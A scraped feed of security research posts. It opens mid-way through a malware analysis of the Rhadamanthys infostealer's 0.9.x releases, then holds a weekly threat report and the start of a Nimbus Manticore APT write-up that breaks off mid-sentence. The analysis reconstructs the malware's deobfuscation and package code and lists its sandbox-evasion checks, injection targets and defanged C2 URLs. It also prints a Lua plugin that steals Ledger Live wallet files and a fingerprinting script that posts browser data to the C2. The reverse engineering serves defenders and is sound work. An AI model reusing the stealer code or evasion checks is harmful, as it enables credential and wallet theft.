trigger WEBHOOK callback - When generating client files, directly select tags from list, generated files named by build tags - Support using multiple server lists for client building - Support relay jump page, real server URL encrypted stored in jump page - Build stub completely removed registry write operations, X64 version, added process injection switch, can choose self-process injection and new process injection - Task execution conditions added HWID condition - LOG display pagination list added log total count display - LOG list page added download count flag block - FILE download added, one-click package all exported logs into a compressed package, convenient for download - Telegram message template, added new filter categories - Added shim server work detection, 5 minutes offline, sends Telegram message notification - Fixed delete duplicate LOG function, keeps latest record - Fixed search function, fixed time search function - Agrent_X wallet, changed to Argent - a Kepler wallet changed to Keplr - API interface changes, added new API interfaces - Get device fingerprint information, added browser fingerprint information collection - Build stub redesigned, higher stability and reliability - Added nonascii: true configuration, supporting non-ASCII character password filtering\nSeveral entries stand out, including the introduction of a global mutex to suppress duplicate executions, expanded process injection options, and a redesigned build stub. These indicate modifications to the core modules.\nVersion 0.9.2, released a few months later and already gaining traction, is not yet listed on the website.\nAs always, such changelogs are written for customers and do not fully capture the points of greatest interest to researchers. However, they still provide useful hints about which areas of the stealer have changed. In the following sections, we present the results of our analysis and highlight the modifications we confirmed, together with several changes that were not documented in the public notes.\nThe first thing that stands out in the updated release (0.9.2) is the introduction of a new message box that appears at the start of the malware. We encounter it as soon as we unpack the initial executable.\nIt’s a well-known fact is that most malware is distributed in a protective layer, meant to thwart static detection. The usual first step of analysis is to remove it and reach the core executable (it can be done automatically, i.e. with the help of tools like PE-sieve/HollowsHunter). Interestingly, after unpacking the latest Rhadamanthys (0.9.2), as we try to run the obtained executable, the warning message shows up, saying: “Do you want to run a malware? (Crypt build to disable this message)”.\nThis message box is familiar to anyone who has ever analyzed the famous Lumma stealer (more info: here [5]).\nIn the past, the Lumma stealer introduced a check aimed at preventing malware distributors from spreading the initial executable in its plain, unprotected form, which can be easily detected. It was also preventing unskilled distributors from getting their own machine infected. The malware checks the file from which it is deployed, and if it found familiar patterns at the defined offsets, it recognizes that it is running from the raw, unpacked sample. In such cases, instead of running malicious actions immediately, a pop-up is displayed, asking the user for permission to continue. An identical check is now performed by Rhadamanthys.\nAt first glance, it may appear that both malware families share the same code, responsible for displaying the message. But upon closer inspection, we can see that completely different APIs are called along the way. In Lumma, opening and reading the file is implemented via raw syscalls, and the message box is executed via NtRaiseHardError\n.\nIn Rhadamanthys, raw syscalls aren’t used, and the same message box is displayed by MessageBoxW\n.\nBoth loaders are obfuscated, but the obfuscation patterns are different. In the case of the Rhadamanthys loader, the APIs used are static, but the code blocks that call them are disconnected – this obfuscation pattern reminds of some LLVM-based obfuscators.\nIn contrast, Lumma code is much more coherent and can be decompiled. The important functions are called via syscalls, using a single proxy function:\nTherefore, despite the surface-level similarity, it seems to be just a behavioral mimicry. We don’t have any proof of links between the Lumma development group and Rhadamanthys; however, it is possible that after Europol’s operation earlier this year, some members of the original Lumma team joined the promising competitor.\nThis message box occurs in the Stage 1 executable. Typically for Rhadamanthys, this executable runs a shellcode in memory, which loads Stage 2, that consist of multiple modules. Its core modules are implemented in a format proprietary to this malware that we denote as XS.\nSince its inception, Rhadamanthys has shipped its executable modules in custom formats rather than the standard PEs. Only the first stage (the initial component), is a typical Windows executable. Its role is to prepare and deploy the set of components, that are unpacked from the internal package.\nCustom formats preserve all the essential components of an executable, such as relocations, import tables, and sections with access rights – but this information is stored in headers fully reinvented by the authors. Unlike PE or ELF files, which are natively supported by the operating systems, custom executables require proprietary loaders. This acts as a form of obfuscation, as standard tools can’t parse them. In addition, the absence of expected headers makes it more difficult to dump those components from memory, and reconstruct them.\nThe evolution of the custom formats used by Rhadamanthys was described in detail in our earlier work From Hidden Bee to Rhadamanthys, along with a tool to convert them into PE for easier study (available here). Since version 0.5, Rhadamanthys modules used formats starting with the magic value XS\n. Two subtypes exist, used at different stages of execution (details outlined here):\nIn v0.9.x, both formats received updates, which we label XS1_B and XS2_B.\nThe first subtype (XS1) contains an extended header, with a field denoting the version number. The current variant is version 4, a direct increment over the previously described one.\nThe header of the XS1_B can be described by the following structure:\n#pragma pack(push, 1) // Adjust to one byte typedef struct { WORD magic; WORD nt_magic; WORD sections_count; **//WORD imp_key; <- removed** WORD hdr_size; BYTE ver; **BYTE imp_key; // <- added here** DWORD module_size; DWORD entry_point; t_XS_data_dir data_dir[XS_DATA_DIR_COUNT]; t_XS_section sections; } t_XS_format_B; #pragma pack(pop) // Back to the previous settings\nThe major change that we can observe is a lack of the WORD field before the header size. In the previous version (XS1_A) this field stood for the key that was used for deobfuscating the names of the DLLs, used in the custom Import Table. Now this field is removed, because the deobfuscating algorithm has been replaced with the new one:\nbool decode_name_B(BYTE* dll_name, size_t name_len) { if (!name_len) { return false; } BYTE out_name[128] = { 0 }; size_t indx = 0; size_t pos = 0; size_t flag = 0; for (size_t i = 0; i < name_len; ++i) { BYTE outC = 0; for (WORD round = 7; round > 0; round--) { BYTE val = dll_name[indx]; if (pos) { flag = (val >> (7 - pos)) & 1; if (pos == 7) { pos = 0; ++indx; } else { ++pos; } } else { flag = val >> 7; pos = 1; } outC |= (flag != 0) << (round - 1); } if (!is_valid_dll_char(outC)) { return false; } out_name[i] = outC; } out_name[name_len] = 0; ::memcpy(dll_name, out_name, name_len); return true; }\nStill, the malware uses an import deobfuscation key (imp_key\n) to resolve imported functions. This time the key is shorter, only one BYTE long. It is used in calculating checksums that are then mapped to particular functions’ names.\nThe next stage format (XS2_B) underwent some lighter modifications. The only thing that changed was one of the fields in the custom import structure: it was extended from WORD to DWORD. This field carries the name of the DLL. In the past it could be carried in an obfuscated form, now it is used as is.\n#pragma pack(push, 1) // Adjust to one byte typedef struct { DWORD dll_name_rva; DWORD first_thunk; DWORD original_first_thunk; **DWORD obf_dll_len; //WORD obf_dll_len;** } t_XS_import_B; #pragma pack(pop) // Back to the previous settings\nAs we can see, the changes do not add any new qualities to the format. The most likely role of the restructuring is to invalidate earlier parsers. It reflects the ongoing pattern of incremental churn aimed at slowing analysts down.\nAll the changes are now reflected in the updates to our tool, and the new modules can be successfully converted into PE.\nThe Stage 2 core, implemented as an XS1 module, starts its execution with various checks that are used to decide if the malware should continue its execution. Most of them have not changed since earlier versions. However, some underwent makeovers.\nIn the past, in consecutive versions of Rhadamanthys, it used the SibCode\nregistry keys in order to save the timestamp of the last execution. Depending on the version, the keys may look like one of the following:\nHKCU\\SOFTWARE\\SibCode\\sn\nHKCU\\SOFTWARE\\SibCode\\sn2\nHKCU\\SOFTWARE\\SibCode\\sn3\nIt was introduced to prevent the sample from being executed again too quickly after the first deployment. While initially the timestamp was saved as a single DWORD, in consecutive releases the author put more effort into making it tamper-proof. It was described in detail in [4] under “Re-Execution Delay Feature”. The presence of this registry key was one of the easy-to-notice symptoms of Rhadamanthys infection. This is probably the reason why the author gave it up completely, mentioning in the 0.9.1 changelog: “Build stub completely removed registry write operations”. Indeed by checking the code we can confirm that the relevant function is now absent.\nIn the earlier releases, Rhadamanthys used to create its mutex in a somewhat repeatable manner, based on a hash made of hardcoded values. This allowed researchers to create a universal vaccine (described in [4]). Now, the author decided to evade this simple way of preventing the malware from running.\nSince 0.9, the Rhadamanthys configuration (described further) includes a 16-byte seed value that participates in mutex name generation. It is hashed along with the magic XRHY\n. The first 16 bytes of the hash are then split into chunks and formatted into the Mutex name:\nPossible format strings for the generation of mutexes:\n\"Global\\MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\" \"Session\\%u\\MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\" \"MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\"\nIf creation of the first mutex option fails, the second is applied, with an index after “Session” that can be in the range 1-8.\nDepending on the flags set in the configuration, the mutex can be passed into all the processes where Rhadamanthys injects its modules (by duplicating the handle). This feature is enabled by default and disabled if the flag 0x40\nor 0x20\nis set. Knowing this, we can search for the handle of the mutex in other processes, to check which belong to the same Rhadamanthys execution tree.\nThe main Rhadamanthys module is shipped with an obfuscated configuration, which is decrypted and parsed at the beginning of the execution. It contains the C2 address, encryption keys used along the way, and various flags that specify which features of the malware will be enabled or disabled. This configuration has evolved considerably across consecutive versions. The explanation of the used fields in a relatively new version (0.7) has been provided in [4].\nThe magic 0x59485221\n( !RHY\n) has been used by this malware since the beginning of its existence. However, in the recent version 0.9.2, it is replaced with the 0xBEEF\nDWORD (first noted here). Also, the configuration content has been significantly extended.\nThe unpacked configuration, starting with 0xBEEF\nmarkers, is not the final version but a compressed form. After the appropriate arguments are fetched, LZO decompression is applied. The result looks as follows:\nWhile in the past the config allowed one C2 per sample, multiple options are now allowed. Example:\nhxxps://193.233.126.43/gateway/iesm4j25.s4pj7 hxxps://193.23.216.48/gateway/iesm4j25.s4pj7\nStructure illustrating the new config (after decompression):\nstruct config_new { DWORD flags; DWORD unk0; BYTE aes_iv[16]; BYTE mutex_seed[16]; BYTE unk1[18]; WORD padding; BYTE urls[256]; };\nAs in the previous version, the configuration is stored in the main sample as a Base64 string, encoded with a custom charset. In the current version, the charset used is: 4NOPQRSTUVWXY567DdeEqrstuvwxyz-ABC1fghop23Fijkbc|lmnGHIJKLMZ089a\n.\nLayers of config deobfuscation before the 0xBEEF\nconfig blob is obtained are:\nAfter that, the configuration is decompressed with LZO algorithm.\nThis model of configuration was also observed in the version 0.9, and 0.9.1. While 0.9.2 changed the marker to 0xBEEF\n, the older variants continued to use the known RHY!\n.\nThe config contains the field flags\nvalues of which are used to off and on some possible execution paths. Overview:\nAs mentioned earlier, the important modules of the malware are stored in an internal package and retrieved on demand.\nIn the past versions, modules were fetched from the package by their names, or even full paths relative to the internal filesystem. This made researchers’ job easier, since we were able to infer functionality just by looking at the name. Now the authors has moved toward obfuscation and has hidden the names. The modules are represented by checksums.\nThe reconstructed package structure (Stage 2):\ntypedef struct DATA_DIR { struct { uint32_t header_rel_off; uint32_t checksum; }; } _DATA_DIR; typedef struct DATA_RECORD { struct { uint32_t size; uint8_t offset[1]; }; } _DATA_RECORD; typedef struct PACKAGE { uint32_t total_size; uint16_t reserved; uint16_t xor_key; uint32_t dir_offset; uint16_t data_offset; uint8_t file_count; uint8_t blk_shift; _DATA_DIR dir[1]; } _PACKAGE;\nWhenever modules are about to be retrieved, the raw package, that is shipped as hardcoded in the initial executable, is first decrypted and decompressed. Each time it is done, a fresh XOR key is set for the obfuscation of the modules. We can observe this inside the decode_package\nfunction:\nOnce the key is generated, the decompressed content of the package is obfuscated, using a simple XOR-based obfuscation. This way, the authors try to minimize the content that is exposed to memory dumping tools.\nvoid xor_based_enc_dec( const uint8_t* src, std::size_t size, uint8_t* dst, uint16_t key) { for (std::size_t i = 0; i < size; ++i) { dst[i] = src[i] ^ static_cast<uint8_t>(key); uint16_t lsb = key & 1u; key >>= 1; if (lsb) key ^= 0xB400u; } }\nThe same XOR-based function is then used to reverse the obfuscation, when the individual module is about to be retrieved. It is done by the function denoted as fetch_from_package\n.\nThe reconstructed algorithm (fetch_from_package\n) is given below:\nBYTE* fetch_from_package(PACKAGE* pkg, uint32_t wanted_checksum, size_t& out_size) { BYTE* base_data = (BYTE*)&pkg->dir_offset + pkg->data_offset; size_t chunk_size = 2 << pkg->blk_shift; for (size_t i = 0; i < pkg->file_count; i++) { if (wanted_checksum != pkg->dir[i].checksum) continue; std::cout << std::dec << i << \"\\t Checksum: \" << std::hex << pkg->dir[i].checksum << \"\\t\"; std::cout << \"Offset: \" << std::hex << pkg->dir[i].header_rel_off << \"\\n\"; DATA_RECORD* rec = (DATA_RECORD*)(reinterpret_cast<ULONG_PTR>(&pkg->dir_offset) + pkg->dir[i].header_rel_off); size_t chunks_count = rec->size / chunk_size; if (rec->size % chunk_size) ++chunks_count; BYTE* buf = (BYTE*)::calloc(rec->size, 1); if (!buf) break; size_t size_decoded = 0; for (size_t j = 0; j < chunks_count; j++) { uint8_t offset = rec->offset[j]; size_t src_ofs = chunk_size * offset; size_t curr_size = chunk_size; size_t remaining = rec->size - size_decoded; if (curr_size > remaining) { curr_size = remaining; } xor_based_enc_dec(&base_data[src_ofs], curr_size, buf + size_decoded, pkg->xor_key); size_decoded += curr_size; } out_size = size_decoded; return buf; } return nullptr; }\nWith the help of our decoder, once you dumped the decompressed package, you can automatically list all the included modules, and unpack them into separate files.\nAlthough the names of modules are now not preserved, we were able to map modules to their previous names by comparing sizes and the common code pattern. The resulting listing is provided in the Appendix A.\nThe initial package, shipped in the sample, contains multiple modules that are dedicated to evasion. They are run before the connection to C2 is established. One of them was previously named “Strategy”. Even though, since the recent changes, the name is no longer mentioned in the code, we will still use it to refer the corresponding module.\n“Strategy” is responsible for extensive environment checks, and detecting if the sample is running in a controlled environment, such as a sandbox, or a machine with analysis tools. In the past releases, it was shipped alongside a single configuration file: processes.x\n, containing the list of forbidden processes to be detected. The file was read from the package, and passed as an argument to the Strategy’s Entry Point. Now the module and its flexibility has been extended. First of all, we no longer pass just the previously fetched list, but the fetching function itself, along with the package. Thanks to this, the Strategy module can load multiple pieces of the needed configuration on demand.\nThe first XS1 module (core), deploys Strategy passing to its Entry Point the pointer to the callback function, and the pointer to the package:\nThe Entry Point of the Strategy module is given below. The execution starts by using the callback function to retrieve the processes list:\nAfter enumerating running processes, and checking them against the forbidden list, the module performs other interesting checks. For example, it gets the current wallpaper, calculates its SHA1, and compares it with the hardcoded one: 5b94362ac6a23c5aba706e8bfd11a5d8bab6097d\nthat represents the default wallpaper of the Triage sandbox. It then checks for the presence of several sample files that are used in some of the sandbox environments: “foobar.jpg”, “foobar.mp3”, “foobar.txt”, “foobar.wri”, “waller.dat”. It checks the current username with the list of usernames typical for sandboxes, such as: “JohnDeo” (likely a typo in “JohnDoe”), “HAL9TH”, “JOHN”, “JOHN-PC”, “MUELLER-PC”, “george”, “DESKTOP-B0T”. It searches for files such as “keys.txt”, “passwords.txt”, and checks if their content is the same by comparing hashes – this detects the presence of some dummy files that are common in sandboxes.\nIf all those checks passed, it finally proceeds to the newly added function. This function needs a deeper explanation. It makes use of two new configuration files that are fetched from the package and processed in the appropriate loops.\nTo understand the meaning of the first configuration file, we need to take a deeper look at how it is processed. Inside the loop, a function is called that generates UUIDs and fetches the node value from it. The API used is UuidCreateSequential\n, which means UUID version 1 is involved. This algorithm, defined by RFC 4122 has an interesting feature. The last part of the structure, Node identifier (48 bits) is a MAC address of a network interface. This was designed in 1980, where the focus on privacy was much lower than it is currently, and MAC addresses were used because of they were guaranteed to be unique for each physical device (assigned by IEEE). Therefore, including the MAC address was the easiest way to ensure no two machines could generate identical UUIDs. Nowadays, this algorithm is considered obsolete. The modern version, UUID v4, doesn’t involve MAC addresses. However, the old UUIDv1 is still available for backward compatibility. The malware uses it for easy and stealthy fetching of MAC addresses from the infected machine. Next, it compares it against the hardcoded list. The listed MAC addresses represent known virtual interfaces. Full listing extracted from the sample can be found here.\nThe second configuration file contains another set of identifiers. This time they contain HardWare IDs which will be compared against the HWID retrieved using a WQL query: \"SELECT UUID FROM [Win32_ComputerSystemProduct]\"\n. This is yet another way to detect known sandboxes. The full listing extracted from the sample can be found here.\nSome of the identifiers overlap with the blocklists used by the infostealer Skuld and Bandit Stealer.\nOnce the initial Rhadamanthys sample successfully cleared the environment as “safe to run”, using multiple dedicated modules, it proceeds to download the next stage from the C2.\nWhen the malware beacons to its C2 server, it sends the Bot ID uniquely identifying the victim system. Currently, the bot ID is generated using two unique identifiers.\nFirst, the malware retrieves a unique machine GUID from the from the registry:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography -> MachineGuid\nNext, it uses the Volume Serial Number retrieved by the API: GetVolumeInformationW\n.\nThey are hashed together, using the SHA1 algorithm. As the Bot ID is now strictly tied to those unique identifiers, it is easier for the attackers to blacklist some machines.\nThe ID is further represented as a hexadecimal string.\nThe same generator can be found in the Netclient (the element of Stage 2, responsible for the communication with the C2), as well as in the Stage 3 (the stealer core).\nDownloading and decoding the main stage of Rhadamanthys (denoted as Stage 3) is managed by the Netclient module. For the first two years of its existence, the malware shipped the package in a steganographic way: as a WAV file, or alternatively, as a JPG:\nThe JPG was used in earlier versions of Rhadamanthys (up to 0.4.5), and the WAV was in a regular use in more recent versions. A very good breakdown of the implementation details of how its steganography was implemented, was given by Bea in her presentation at Botconf 2024.\nThe Netclient module was significantly reworked since the latest version, 0.9.2. As before, the responsible function is installed as a callback fired up when a particular content type is encountered. This time, the expected type is image/png\n:\nThe decoding function:\nThe whole mechanism of decryption, and verification of the payload, is very similar to what we saw before. The main difference lies in how the input data is obtained. Previously, the bytes of the payload were hidden in some template file (JPG or WAV) that at first looked legitimate. A specific, custom steganogaphic algorithm was first used to grab the bytes interwoven in the media content. Now the author has given up the facade, and the data is stored right away as a pixels, following the structure:\ntypedef struct png_data { BYTE key_n[0x20]; BYTE key_e[0x20]; DWORD size; BYTE hash[0x14]; BYTE data[1]; }_png_data;\nIt gives a noisy-looking image: unappealing comparing to the author’s earlier attempts at steganography, but good enough to do its job. Example:\nAs before, the decoding of the package from the PNG is not possible without the shared secret that is established during the communication with the C2. Therefore, we can’t simply decode the next stage from the PNG captured in the traffic.\nRhadamanthys downloads its final stage using the Netclient module, that is loaded into the initial process. The fetched data is decrypted locally, making it a second package with modules. However, further unpacking and loading is be done inside another process. As a cover, Rhadamanthys creates a legitimate process, which is first run in a suspended mode. The components needed to initiate the second part of the loading chain are implanted there.\nIn past releases, the list of the possible targets was hardcoded in the sample, and one of the options was picked randomly. Since the author introduces more and more configurability, now this list is also shipped in a new file of the package. It makes it easily modifiable by the distributors.\nIn the currently analyzed module, it contains the following options:\n%Systemroot%\\system32\\bthudtask.exe %Systemroot%\\system32\\dllhost.exe %Systemroot%\\SysWOW64\\dllhost.exe %Systemroot%\\system32\\taskhostw.exe %Systemroot%\\SysWOW64\\TsWpfWrp.exe %Systemroot%\\system32\\spoolsv.exe %Systemroot%\\system32\\wuaulct.exe %Systemroot%\\system32\\AtBroker.exe %Systemroot%\\SysWOW64\\AtBroker.exe %Systemroot%\\system32\\fontdrvhost.exe %Systemroot%\\SysWOW64\\TsWpfWrp.exe %Systemroot%\\SysWOW64\\xwizard.exe %Systemroot%\\SysWOW64\\msinfo32.exe %Systemroot%\\SysWOW64\\msra.exe\nThe list is retrieved from the package. In two consecutive loops, the malware first checks which of the paths are accessible on the victim machine, and collects them in another list. That list is passed to the second loop, which randomly picks a path from the available options.\nThe old list of processes is still used as a backup. Therefore, if the names from the list are not found in the system, the malware tries to run one of the followings:\n\"%Systemroot%\\\\system32\\\\credwiz.exe\" \"%Systemroot%\\\\system32\\\\OOBE-Maintenance.exe\" \"%Systemroot%\\\\system32\\\\dllhost.exe\" \"%Systemroot%\\\\system32\\\\openwith.exe\" \"%Systemroot%\\\\system32\\\\rundll32.exe\"\nDiversification of the options creates another headache for incident responders.\nSince version 0.5, the majority of the strings used by Rhadamanthys, especially in its core modules, are obfuscated (details: [2]). The obfuscation scheme differs depending on the stage (XS1 vs XS2). To address this, we previously published two distinct IDA scripts, one for each variant.\nReviewing the 0.9.x version, we found that one of the scripts needed modifications. Stage 2 (and the custom modules XS1_B) introduced no changes in string obfuscation – and our previously published IDA script [2] can still be applied. However, in Stage 3 (XS2_B modules), the algorithm was rewritten. The custom XOR-based algorithm was replaced with RC4.\nThe change doesn’t introduce any additional difficulty in decrypting it. It was probably added only to break existing tools, and disrupt the expected patterns. However, pinpointing the string deobfuscation functions is now more difficult, since they come as multiple different instances. In the past there were just two main string deobfuscation functions, one for ANSI, and another for Unicode strings. Once we identified them, and filled in their expected names in the IDB, we could quickly apply the script to deobfuscate all the strings.\nCurrently, finding all the instances requires a bit more effort. Just like in the past, ANSI strings are decoded by different functions than Unicode strings. But then there are other subtypes. In some of those functions, the encrypted string is passed via the first argument (we denote them as dec_cstringA\n/ dec_wstringA\n), and others, it is passed via the second argument (we denote them as dec_cstringB\n/ dec_wstringB\n).\nThose functions may be called directly in the code, or used via various wrappers.\nIn order to decrypt all the strings, we have to find all the variants, and their wrappers.\nWe provide the updated decryption script, that can be used for XS2_B [here]. The script assumes that the deobfuscating functions in our IDB are renamed appropriately (as presented [here]).\nA listing of the deobfuscated strings from the analyzed sample is available [here].\nOnce the core stealer modules are downloaded and deployed, they carry out the main operations, and remain in communication with the C2 to upload the results, and receive commands. As in the previous Rhadamanthys variants, the communication is established via WebSocket, and uses the C2 address that is in the initial configuration.\nBefore the attempt to establish the connection to its C2, the sample queries the following services for the time, in random order:\n\"time.google.com\" \"time.cloudflare.com\" \"time.facebook.com\" \"time.windows.com\" \"time.apple.com\" \"time-a-g.nist.gov\" \"ntp.time.in.ua\" \"ts1.aco.net\" \"ntp1.net.berkeley.edu\" \"ntp.nict.jp\" \"x.ns.gin.ntt.net\" \"gbg1.ntp.se\" \"ntp1.hetzner.de\" \"ntp.time.nl\" \"pool.ntp.org\"\nThis was added in the recent editions of Rhadamanthy (0.9.x) and was not seen in earlier releases.\nAn interesting detail added in the latest version in Rhadamanthys is, that the URL from the configuration is further processed. First, the following algorithm is used to generate a random string:\nvoid generate_domain_str(char *buf, size_t max) { srand(time(0)); rand(); for (size_t i = 0; i < max; i++) { int rval = rand(); BYTE c = rval - 0x1A * (((((unsigned __int64)(0x4EC4EC4FLL * rval) >> 0x20) & 0x80000000) != 0LL) + ((int)((unsigned __int64)(0x4EC4EC4FLL * rval) >> 0x20) >> 3)) + 0x61; buf[i] = c; } }\nWhen this algorithm is applied, the domain from the config is partially overwritten by the random content. The length of the URL before the first “/” (i.e. denoting the IP and the port) is used as the length of the new string. Next, the ‘.’ is inserted two characters before the new string end, making it look like a domain.\nExamples of the transformations:\n192.30.242[.]210:8888/gateway/qq7o8k3h.fnliq\n→ hxxps://mohbskyjlaztloar.dq/gateway/qq7o8k3h.fnliq\n193.84.71[.]81/gateway/wcm6paht.htbq1\n→ hxxps://jvmhnrlbt.xf/gateway/wcm6paht.htbq1\nAt first it looks like DGA, however, the generated domains do not resolve, and they are too random to really be used. The generation algorithm makes the output sensitive not just to a different date, but it changes every second.\nThe address of the C2 that we can observe in the network communication is still the same as the one in the config.\nIt is possible that the authors added it just as an additional confusion.\nSince its early releases, Rhadamanthys core stealer comes with a built-in Lua runner. It serves additional stealer plugins written in this language.\nAll available Lua stealers (in 0.9.1):\nThe recent release (0.9.2) added a single Lua extension (id: 0x23) for Ledger Live crypto wallet app:\nlocal files = {} local file_count = 0 if not framework.flag_exist(\"W\") then return end local paths = { framework.parse_path([[%AppData%\\Ledger Live]]), framework.parse_path([[%LOCALAppData%\\Ledger Live]]) } for i, path in ipairs(paths) do if path ~= nil and framework.path_exist(path) then local offset = string.len(path) + 2 framework.fs_search(path, function(entry) local name = string.sub(entry.Filename, offset) files[name] = entry.Filename file_count = file_count + 1 end,true) if file_count > 0 then break end end end if file_count > 0 then for k, v in pairs(files) do framework.add_file(k, v) end framework.set_commit(\"!CP:LedgerLive\")\nIn the latest releases, the package at Stage 3 was enriched with few more modules. They are:\nchrome_extension.dat\nfingerprint.js\nindex.html\nThe most interesting one is fingerprint.js\n. It is a JavaScript, which starts with the following comment: Browser Fingerprint Export Tool ; Used to collect browser fingerprint information and export as JSON\n. It is meant to be opened by a browser and collect a variety of information about its configuration. The main function of the script is called asynchronously and it collects all the information into a JSON report:\nasync function main() { try { const fingerprint = await collectAllFingerprints(); await fetch('/p/result', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(fingerprint) }); } catch (error) { console.error('Fingerprint collection or send error:', error); } }\nThe function that does the data collection comes with extensive comments, showing what type of data we can expect to be gathered.\n// Collect all fingerprint information async function collectAllFingerprints() { const fingerprint = { // Timestamp timestamp: new Date().toISOString(), // Basic system info system: await collectSystemInfo(), // Browser info browser: collectBrowserInfo(), // WebGL info webgl: await collectWebGLInfo(), // Canvas info canvas: await collectCanvasInfo(), // Network info network: await collectNetworkInfo(), // Screen info screen: collectScreenInfo(), // Hardware info hardware: collectHardwareInfo(), // Language info language: collectLanguageInfo(), // Fonts info fonts: await detectAvailableFonts(), // WebRTC info webrtc: await getWebRTCInfo(), // Web Audio info audio: await getWebAudioInfo(), // Miscellaneous features misc: collectMiscFeatures() }; return fingerprint; }\nOnce this script is deployed, it allows the attackers to grab additional information about the browsers installed on the victim system, and their settings. For example, it allows to list all the plugins installed, and checks if the following features are enabled:\nIt also pinpoints the precise product version and build.\nThe index.html\nis very simple, and seems to be used just as a carrier where the fingerprint.js\nwill be embedded:\n<!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"UTF-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> </head> <body> <script src=\"/p/fp.js\"></script> </body> </html>\nRhadamanthys looked mature from the start, given that its codebase draws heavily from the authors’ earlier project, Hidden Bee. Its initial development was fast-paced, as the authors invested heavily in rapid feature growth to gain momentum and attract customers. They kept reworking the codebase, introduced extensions and add-ons that increased flexibility, allowing customization for diverse use cases. Currently, the development is slower and steadier: the core design remains intact, with changes focused on refinements – such as new stealer components, changes in obfuscation, and more advanced customization options.\nThe latest variant represents an evolution rather than a revolution. Analysts should update their config parsers, monitor PNG-based payload delivery, track changes in mutex and bot ID formats, and expect further churn in obfuscation as tooling catches up. If this trajectory continues, a future 1.0 release may emphasize stability and professionalization, further cementing Rhadamanthys as a long-term player in the stealer ecosystem.\nCheck Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.\nAnalyzed samples:\nhxxps://193.84.71.81/gateway/wcm6paht.htbq1\nThe modules marked by bold font are the ones introduced in the current release. The modules marked italic didn’t change since the previous release.\nStage 2 [32] – Unpacked from the hardcoded package (set extracted from a 32-bit sample) ; Rhadamanthys 0.9.2\nStage 2 [64] – Unpacked from the hardcoded package (set extracted from a 64-bit sample) ; Rhadamanthys 0.9.2\nStage 3 – Downloaded from the C2:\n├── bin │ ├── amd64 │ │ ├── coredll.bin │ │ ├── imgdat.bin │ │ ├── stubmod.bin │ │ └── taskcore.bin │ ├── i386 │ │ ├── coredll.bin │ │ ├── stubmod.bin │ │ └── taskcore.bin │ ├── KeePassHax.dll │ ├── loader.dll │ └── runtime.dll └── etc ├── bip39.txt ├── chrome_extension.dat ├── fingerprint.js └── index.html\n[2] https://research.checkpoint.com/2023/rhadamanthys-v0-5-0-a-deep-dive-into-the-stealers-components/\n[3] https://research.checkpoint.com/2024/massive-phishing-campaign-deploys-latest-rhadamanthys-version/\n[4] https://go.recordedfuture.com/hubfs/reports/mtp-2024-0926.pdf\n[5] https://outpost24.com/blog/lummac2-anti-sandbox-technique-trigonometry-human-detection/", "timestamp": "2025-10-21T13:35:57.844096"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "29th September – Threat Intelligence Report", "url": "https://research.checkpoint.com/2025/29th-september-threat-intelligence-report/", "published": "Mon, 29 Sep 2025 12:43:59 +0000", "content": "29th September – Threat Intelligence Report\nSeptember 29, 2025\nFor the latest discoveries in cyber research for the week of 29th September, please download our Threat Intelligence Bulletin.\nTOP ATTACKS AND BREACHES\nVULNERABILITIES AND PATCHES\nTHREAT INTELLIGENCE REPORTS\nCheck Point Threat Emulation, Harmony Endpoint, IPS and AB blades provide protection against this threat\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (Ransomware.Win.LockBit; Ransomware.Wins.LockBit; Ransomware.Wins.Lockbit.ta.*)", "timestamp": "2025-10-21T13:35:58.450116"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "Nimbus Manticore Deploys New Malware Targeting Europe", "url": "https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/", "published": "Mon, 22 Sep 2025 12:59:34 +0000", "content": "Since early 2025, Check Point Research (CPR) has tracked waves of Nimbus Manticore activity. Known as UNC1549 or Smoke Sandstorm, Nimbus Manticore is a mature Iran-nexus APT group that primarily targets aerospace and defense organizations in the Middle East and Europe. Some of its operations were also previously described as the Iranian DreamJob campaign.\nNimbus Manticore’s activity is characterized by highly targeted phishing campaigns leading to the deployment of custom implants, including Minibike. First reported by Mandiant in June 2022, Minibike, also known as SlugResin, has evolved steadily since its creation. Sample analysis over the years shows its progress, including the addition of obfuscation techniques to evade detection and static analysis, a modular architecture, and the introduction of redundant command-and-control (C2) servers.\nThe most recent Minibike variants suggest a significant increase in the actor’s abilities, including using a novel (and previously undocumented) technique to load DLLs from alternate paths by modifying process execution parameters. This variant has new TTPs such as size inflation, junk code, obfuscation, and code signing to lower detection rates.\nIn this article, we highlight the evolution of Minibike into a new variant dubbed MiniJunk. We also examine a distinct cluster within the Nimbus Manticore umbrella that targets different sectors and employs unique domain naming conventions, while continuing to use similar spear-phishing techniques and share malware resources.\nWhile we were finalizing this publication, PRODAFT has released a comprehensive report on Subtle Snail, an espionage group with connections to Iran. In this publication, we address Subtle Snail in the chapter entitled ‘Separate Cluster of Activity”. While this cluster employs tactics, techniques, and procedures (TTPs) that broadly align with those observed in Nimbus Manticore operations, it is differentiated by its unique malware capabilities, command-and-control (C2) infrastructure, and targeting preferences.\nThe attack starts with a phishing link that directs the victim to a fake job-related login page:\nFigure 1 – Websites used to deliver malicious archives after successful login.\nThe infrastructure used by the attacker to lure job seekers is based on the React template, which varies depending on the impersonated brand, such as Boeing, Airbus, Rheinmetall and flydubai.\nThe domain naming convention is usually “career” themed and registered behind Cloudflare, most likely to keep the real server IP confidential.\nThe credentials for these login panels are pre-shared with the victim together with a link to the login page. After entering credentials and clicking the login button, a post request is sent to /login-user\napi. If the credentials are not correct, a 401 Unauthorized\nresponse is returned. Otherwise, the user downloads a malicious archive with the malware.\nA malicious archive downloaded by the victim often masquerades as legitimate hiring process-related software. In the following example, a ZIP archive named Survey.zip\nstarts an elaborated infection chain. The execution chain leverages a unique technique 